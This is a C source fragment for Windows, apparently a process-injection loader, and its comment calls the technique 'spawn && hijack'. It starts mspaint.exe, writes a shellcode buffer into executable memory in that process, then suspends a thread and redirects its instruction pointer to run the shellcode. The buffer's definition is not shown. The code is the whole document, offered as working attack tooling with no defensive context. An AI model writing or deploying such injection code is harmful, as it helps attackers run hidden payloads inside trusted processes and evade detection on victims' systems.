
int main()
{
    //process to spawn && hijack
    LPCSTR victimImage = "c:\\windows\\system32\\mspaint.exe";
    
    STARTUPINFOA su;
    PROCESS_INFORMATION pi;

    memset(&su, 0x00, sizeof(su));
    memset(&pi, 0x00, sizeof(pi));
    su.cb = sizeof(su);

    CreateProcessA(0, (LPSTR)victimImage,0,0,0,NORMAL_PRIORITY_CLASS,0,0,&su,&pi);
    DWORD processId = pi.dwProcessId;


    HANDLE h_thread;
    THREADENTRY32 threadEntry;
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    //HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    PVOID b_shellcode = VirtualAllocEx(pi.hProcess, NULL, sizeof buffer, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, b_shellcode, buffer, sizeof buffer, NULL);

    HANDLE h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    Thread32First(h_snapshot, &threadEntry);

    do {
        if (threadEntry.th32OwnerProcessID == processId)
        {
            h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
            break;
        }
    } while (Thread32Next(h_snapshot, &threadEntry));

    CloseHandle(h_snapshot);

    SuspendThread(h_thread);

    GetThreadContext(h_thread, &context);
    context.Rip = (DWORD_PTR)b_shellcode;
    SetThreadContext(h_thread, &context);
    
    ResumeThread(h_thread);

    WaitForSingleObject(pi.hProcess, INFINITE);
}